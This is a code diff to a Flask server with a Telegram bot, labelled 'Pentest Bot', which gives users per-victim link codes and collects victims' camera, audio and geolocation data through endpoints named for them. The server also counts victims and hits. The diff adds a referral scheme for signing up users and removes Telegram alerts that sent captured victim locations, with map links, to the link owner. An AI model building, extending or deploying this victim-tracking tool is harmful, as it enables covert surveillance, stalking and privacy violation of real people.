@@ -1,6 +1,6 @@
 from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
-import os, json, threading
+import os, json, threading, time, sys
 from config import BASE_URL, PORT
 from database import db
 
@@ -12,18 +12,53 @@ def start_bot():
     global bot_started
     if bot_started: return
     try:
-        from bot import run
-        t = threading.Thread(target=run, daemon=True)
+        import telebot
+        from config import BOT_TOKEN
+        bot = telebot.TeleBot(BOT_TOKEN)
+        
+        @bot.message_handler(commands=['start'])
+        def start(m):
+            uid = m.from_user.id
+            un = m.from_user.username or 'User'
+            fn = m.from_user.first_name or ''
+            user = db.get_user(uid)
+            new = False
+            if not user:
+                db.create_user(uid, un, fn)
+                user = db.get_user(uid)
+                new = True
+            args = m.text.split()
+            if len(args) > 1 and new:
+                try:
+                    rid = int(args[1])
+                    if rid != uid and user and not user['referred_by']:
+                        if db.add_referral(rid, uid):
+                            try:
+                                bot.send_message(rid, f"New referral!\n{fn} joined!\nTotal: {db.get_user(rid)['refer_count']}")
+                            except: pass
+                except: pass
+            kb = telebot.types.InlineKeyboardMarkup()
+            kb.add(telebot.types.InlineKeyboardButton("Test", callback_data="test"))
+            bot.send_message(uid, f"Hello {fn}!\nBot is working!", reply_markup=kb)
+        
+        @bot.callback_query_handler(func=lambda c: True)
+        def cb(c):
+            bot.answer_callback_query(c.id, "Button works!")
+            bot.edit_message_text("You clicked the button!", c.from_user.id, c.message.message_id)
+        
+        t = threading.Thread(target=bot.infinity_polling, kwargs={'timeout':30, 'skip_pending':True}, daemon=True)
         t.start()
         bot_started = True
-        print('Bot thread started')
+        print("Bot started successfully!", flush=True)
     except Exception as e:
-        print(f'Bot error: {e}')
+        print(f"Bot error: {e}", flush=True)
+        import traceback
+        traceback.print_exc()
 
 @app.route('/')
 def index():
     s = db.get_stats()
-    return f'<html><body style="background:#0d1117;color:#c9d1d9;text-align:center;padding:100px 20px"><h1 style="color:#58a6ff">Pentest Bot</h1><p style="color:#3fb950">Running</p><p>Users: {s["users"]} | Victims: {s["victims"]}</p></body></html>'
+    return f'<html><body style="background:#0d1117;color:#c9d1d9;text-align:center;padding:100px 20px"><h1 style="color:#58a6ff">Pentest Bot</h1><p style="color:#3fb950">Running</p><p>Users: {s["users"]} | Victims: {s["victims"]}</p><p>Bot: {"✅ Active" if bot_started else "❌ Not started"}</p></body></html>'
 
 @app.route('/camera/<code>')
 def page_cam(code):
@@ -46,12 +81,6 @@ def api_cam(code):
         d = request.get_json(force=True, silent=True)
         if not d: return jsonify({'status':'error'}), 400
         db.update_victim_data(code, 'camera', d)
-        o = db.get_victim_owner(code)
-        if o:
-            try:
-                from bot import bot
-                bot.send_message(o, f'Camera data!\nCode: {code}')
-            except: pass
         return jsonify({'status':'ok'})
     except: return jsonify({'status':'error'}), 500
 
@@ -61,13 +90,6 @@ def api_loc(code):
         d = request.get_json(force=True, silent=True)
         if not d: return jsonify({'status':'error'}), 400
         db.update_victim_data(code, 'location', d)
-        o = db.get_victim_owner(code)
-        if o:
-            try:
-                from bot import bot
-                lat = d.get('lat','?'); lng = d.get('lng','?')
-                bot.send_message(o, f'Location!\n{lat},{lng}\nhttps://www.google.com/maps?q={lat},{lng}')
-            except: pass
         return jsonify({'status':'ok'})
     except: return jsonify({'status':'error'}), 500
 
@@ -77,12 +99,6 @@ def api_aud(code):
         d = request.get_json(force=True, silent=True)
         if not d: return jsonify({'status':'error'}), 400
         db.update_victim_data(code, 'audio', d)
-        o = db.get_victim_owner(code)
-        if o:
-            try:
-                from bot import bot
-                bot.send_message(o, f'Audio data!\nCode: {code}')
-            except: pass
         return jsonify({'status':'ok'})
     except: return jsonify({'status':'error'}), 500
 
@@ -93,5 +109,6 @@ def api_check(code):
     return jsonify({'exists':True,'camera':bool(v['camera_data']),'location':bool(v['location_data']),'audio':bool(v['audio_data']),'hits':v['access_count']})
 
 if __name__ == '__main__':
+    print("Starting server...", flush=True)
     start_bot()
     app.run(host='0.0.0.0', port=PORT, debug=False)
